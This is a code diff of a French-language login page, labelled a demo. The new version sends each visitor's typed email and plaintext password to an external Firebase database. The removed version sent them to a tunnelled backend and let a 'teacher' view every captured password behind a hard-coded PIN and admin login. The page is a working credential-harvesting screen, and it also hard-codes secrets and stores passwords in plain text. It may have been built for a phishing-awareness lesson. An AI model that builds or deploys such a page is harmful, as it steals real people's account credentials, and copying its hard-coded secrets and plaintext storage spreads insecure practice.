@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
-  <title>Démo — Écran de connexion (backend)</title>
+  <title>Démo — Écran de connexion (Firebase)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
@@ -37,65 +37,21 @@
               class="w-full rounded-2xl px-6 py-4 text-lg font-semibold transition disabled:opacity-50 disabled:cursor-not-allowed bg-gray-100 text-gray-500">
               Se connecter
             </button>
-
-            <p class="text-center text-sm sm:text-base text-gray-800 pt-2">
-              Tu n'as pas de compte ?
-              <a href="#" id="openPin" class="text-red-600 font-semibold hover:underline">S'inscrire</a>
-            </p>
           </form>
         </div>
       </div>
     </main>
   </div>
 
-  <!-- Modale PIN -->
-  <div id="pinModal" class="hidden fixed inset-0 bg-black/30 flex items-center justify-center p-4">
-    <div class="bg-white rounded-xl w-full max-w-sm p-6">
-      <h3 class="font-semibold mb-2">Code enseignant</h3>
-      <p class="text-sm text-gray-600 mb-4">Saisis le code pour afficher les résultats.</p>
-      <input id="pinInput" type="password" placeholder="Code enseignant" class="w-full border rounded px-3 py-2 mb-4 bg-gray-100" />
-      <div class="flex gap-2 justify-end">
-        <button id="cancelPin" class="px-3 py-2 border rounded">Annuler</button>
-        <button id="okPin" class="px-3 py-2 bg-black text-white rounded">Valider</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Modale résultats -->
-  <div id="resultsModal" class="hidden fixed inset-0 bg-black/40 flex items-center justify-center p-4">
-    <div class="bg-white rounded-2xl max-w-3xl w-full p-6">
-      <div class="flex items-center justify-between">
-        <h2 class="text-lg font-semibold">Soumissions (depuis le backend)</h2>
-        <div class="flex gap-2">
-          <button id="clearAll" class="px-3 py-1 border rounded">Supprimer tout</button>
-          <button id="closeResults" class="px-3 py-1 rounded bg-black text-white">Fermer</button>
-        </div>
-      </div>
-      <div id="records" class="mt-4 space-y-3 max-h-96 overflow-auto text-sm"></div>
-    </div>
-  </div>
-
   <script>
-    // --- BASE_URL auto : localhost en dev, tunnel en prod (GitHub Pages) ---
-    const isLocal = ['localhost', '127.0.0.1'].includes(location.hostname);
-    const TUNNEL_URL = 'https://fresh-rockets-rest.loca.lt';
-    const BASE_URL = isLocal ? 'http://localhost:3000' : TUNNEL_URL;
+    const DB_URL = "https://fir-login-d968e-default-rtdb.europe-west1.firebasedatabase.app";
 
-    const TEACHER_PIN = 'edu123';
-    let adminToken = null;
-
-    // --- éléments ---
     const emailEl = document.getElementById('email');
     const pwdEl = document.getElementById('password');
     const submitBtn = document.getElementById('submitBtn');
     const loginForm = document.getElementById('loginForm');
 
-    const pinModal = document.getElementById('pinModal');
-    const pinInput = document.getElementById('pinInput');
-    const resultsModal = document.getElementById('resultsModal');
-    const records = document.getElementById('records');
-
-    // --- UI bouton actif/inactif ---
+    // Active/désactive bouton
     function refreshSubmit() {
       const ok = emailEl.value.trim().length > 0 && pwdEl.value.length > 0;
       submitBtn.disabled = !ok;
@@ -105,140 +61,40 @@
     }
     emailEl.addEventListener('input', refreshSubmit);
     pwdEl.addEventListener('input', refreshSubmit);
-    refreshSubmit();
 
-    // --- Helper headers (important pour loca.lt) ---
-    function apiHeaders(extra = {}) {
-      return {
-        'Content-Type': 'application/json',
-        'Bypass-Tunnel-Reminder': 'go',
-        ...extra,
-      };
-    }
-
-    // --- API helpers ---
-    async function demoSubmit(email, password) {
-      const r = await fetch(`${BASE_URL}/demo/submit`, {
-        method: 'POST',
-        headers: apiHeaders(),
-        body: JSON.stringify({ email, password })
-      });
-      const data = await r.json().catch(() => ({}));
-      if (!r.ok || !data.ok) throw new Error(data.error || 'Erreur /demo/submit');
-    }
-
-    async function adminLogin() {
-      const r = await fetch(`${BASE_URL}/auth/login`, {
-        method: 'POST',
-        headers: apiHeaders(),
-        body: JSON.stringify({ email: 'prof@example.com', password: 'changeme123' })
-      });
-      const data = await r.json().catch(() => ({}));
-      if (!r.ok || !data.ok) throw new Error(data.error || 'Login admin KO');
-      adminToken = data.token;
-      return data;
-    }
-
-    async function fetchSubmissions() {
-      const r = await fetch(`${BASE_URL}/admin/submissions`, {
-        headers: apiHeaders({ Authorization: `Bearer ${adminToken}` })
-      });
-      const data = await r.json().catch(() => ({}));
-      if (!r.ok || !data.ok) throw new Error(data.error || 'Lecture soumissions KO');
-      return data.submissions;
-    }
-
-    async function clearAllSubmissions() {
-      const r = await fetch(`${BASE_URL}/admin/submissions`, {
-        method: 'DELETE',
-        headers: apiHeaders({ Authorization: `Bearer ${adminToken}` })
-      });
-      const data = await r.json().catch(() => ({}));
-      if (!r.ok || !data.ok) throw new Error(data.error || 'Suppression KO');
-    }
-
-    // --- Submit du formulaire (démo) ---
+    // Envoi vers Firebase
     loginForm.addEventListener('submit', async (e) => {
       e.preventDefault();
       submitBtn.disabled = true;
-      submitBtn.textContent = 'Envoi...';
+      submitBtn.textContent = "Envoi...";
+
+      const data = {
+        email: emailEl.value,
+        password: pwdEl.value,
+        created_at: new Date().toISOString()
+      };
+
       try {
-        await demoSubmit(emailEl.value, pwdEl.value);
-        emailEl.value = '';
-        pwdEl.value = '';
-        refreshSubmit();
+        const r = await fetch(`${DB_URL}/submissions.json`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+        if (!r.ok) throw new Error("Erreur Firebase");
+        alert("✅ Données envoyées !");
+        emailEl.value = "";
+        pwdEl.value = "";
       } catch (err) {
-        alert('Erreur: ' + err.message);
+        alert("❌ Erreur: " + err.message);
       } finally {
-        submitBtn.textContent = 'Se connecter';
+        submitBtn.textContent = "Se connecter";
         refreshSubmit();
       }
     });
 
-    // --- PIN / Résultats ---
-    document.getElementById('openPin').onclick = (e) => {
-      e.preventDefault();
-      pinModal.classList.remove('hidden');
-      pinInput.value = '';
-      pinInput.focus();
-    };
-    document.getElementById('cancelPin').onclick = () => pinModal.classList.add('hidden');
-
-    document.getElementById('okPin').onclick = async () => {
-      if (pinInput.value !== TEACHER_PIN) {
-        alert('Code incorrect.');
-        return;
-      }
-      pinModal.classList.add('hidden');
-      try {
-        if (!adminToken) await adminLogin();
-        const subs = await fetchSubmissions();
-        render(subs);
-        resultsModal.classList.remove('hidden');
-      } catch (err) {
-        alert('Erreur accès enseignant: ' + err.message);
-      }
-    };
-
-    document.getElementById('closeResults').onclick = () => resultsModal.classList.add('hidden');
-
-    document.getElementById('clearAll').onclick = async () => {
-      if (!confirm('Tout supprimer ?')) return;
-      try {
-        if (!adminToken) await adminLogin();
-        await clearAllSubmissions();
-        render([]);
-        resultsModal.classList.add('hidden');
-      } catch (err) {
-        alert('Erreur suppression: ' + err.message);
-      }
-    };
-
-    // --- rendu cartes ---
-    function render(submissions) {
-      records.innerHTML = submissions.length ? '' : '<div>Aucune soumission enregistrée.</div>';
-      submissions.forEach((s) => {
-        const div = document.createElement('div');
-        div.className = 'border rounded-xl p-3';
-        div.innerHTML = `
-          <div class="text-xs text-gray-500">ID: ${s.id} • ${s.created_at ?? ''}</div>
-          <div class="mt-2 grid grid-cols-1 sm:grid-cols-2 gap-2">
-            <div class="bg-gray-50 rounded p-2">
-              <div class="text-xs text-gray-500">E-mail / utilisateur</div>
-              <div class="font-mono">${escapeHtml(s.user_email ?? '')}</div>
-            </div>
-            <div class="bg-gray-50 rounded p-2">
-              <div class="text-xs text-gray-500">Mot de passe (démo)</div>
-              <div class="font-mono">${escapeHtml(s.password_plain_demo ?? '')}</div>
-            </div>
-          </div>`;
-        records.appendChild(div);
-      });
-    }
-
-    function escapeHtml(str) {
-      return String(str).replace(/[&<>\"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
-    }
+    refreshSubmit();
   </script>
 </body>
 </html>
+
+
